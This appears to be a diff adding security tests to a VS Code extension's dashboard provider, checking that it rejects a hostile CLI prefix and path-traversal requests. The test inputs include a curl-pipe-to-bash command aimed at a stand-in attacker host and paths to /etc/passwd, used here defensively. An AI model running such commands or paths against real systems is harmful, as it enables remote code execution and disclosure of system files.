@@ -159,6 +159,34 @@ suite('DashboardViewProvider - EXECUTE_WORKFLOW handler', () => {
     assert.strictEqual(mockTerminal.sendText.firstCall.args[0], 'aider /bmad-bmm-dev-story');
   });
 
+  test('rejects cliPrefix with shell metacharacters', async () => {
+    sandbox.stub(vscode.window, 'terminals').value([]);
+    sandbox.stub(vscode.workspace, 'getConfiguration').returns({
+      get: (key: string, defaultValue: string) =>
+        key === 'cliPrefix' ? 'curl evil.com | bash #' : defaultValue,
+    } as unknown as vscode.WorkspaceConfiguration);
+    const showErrorStub = sandbox.stub(vscode.window, 'showErrorMessage').resolves();
+
+    const provider = new DashboardViewProvider(vscode.Uri.file('/test'), createDetectedResult());
+    const { view, simulateMessage } = createMockWebviewView();
+
+    provider.resolveWebviewView(
+      view,
+      {} as vscode.WebviewViewResolveContext,
+      new vscode.CancellationTokenSource().token
+    );
+
+    simulateMessage({
+      type: 'EXECUTE_WORKFLOW',
+      payload: { command: '/bmad-bmm-dev-story' },
+    });
+
+    await new Promise((resolve) => setTimeout(resolve, 50));
+
+    assert.ok(createTerminalStub.notCalled, 'Should NOT create a terminal for invalid prefix');
+    assert.ok(showErrorStub.calledOnce, 'Should show error message');
+  });
+
   test('rejects command that does not match /bmad- pattern', async () => {
     sandbox.stub(vscode.window, 'terminals').value([]);
     const showErrorStub = sandbox.stub(vscode.window, 'showErrorMessage').resolves();
@@ -317,6 +345,48 @@ suite('DashboardViewProvider - OPEN_DOCUMENT handler', () => {
     assert.ok(openTextDocumentStub.calledOnce, 'Should open as text document');
     assert.ok(showTextDocumentStub.calledOnce, 'Should show text document');
     assert.ok(executeCommandStub.notCalled, 'Should NOT use markdown.showPreview');
+  });
+
+  test('rejects path traversal with .. sequences', async () => {
+    const provider = new DashboardViewProvider(vscode.Uri.file('/test'), createDetectedResult());
+    const { view, simulateMessage } = createMockWebviewView();
+
+    provider.resolveWebviewView(
+      view,
+      {} as vscode.WebviewViewResolveContext,
+      new vscode.CancellationTokenSource().token
+    );
+
+    simulateMessage({
+      type: 'OPEN_DOCUMENT',
+      payload: { path: '../../etc/passwd' },
+    });
+
+    await new Promise((resolve) => setTimeout(resolve, 50));
+
+    assert.ok(executeCommandStub.notCalled, 'Should NOT execute any command');
+    assert.ok(openTextDocumentStub.notCalled, 'Should NOT open any document');
+  });
+
+  test('rejects absolute paths', async () => {
+    const provider = new DashboardViewProvider(vscode.Uri.file('/test'), createDetectedResult());
+    const { view, simulateMessage } = createMockWebviewView();
+
+    provider.resolveWebviewView(
+      view,
+      {} as vscode.WebviewViewResolveContext,
+      new vscode.CancellationTokenSource().token
+    );
+
+    simulateMessage({
+      type: 'OPEN_DOCUMENT',
+      payload: { path: '/etc/passwd' },
+    });
+
+    await new Promise((resolve) => setTimeout(resolve, 50));
+
+    assert.ok(executeCommandStub.notCalled, 'Should NOT execute any command');
+    assert.ok(openTextDocumentStub.notCalled, 'Should NOT open any document');
   });
 
   test('shows error message when document opening fails', async () => {
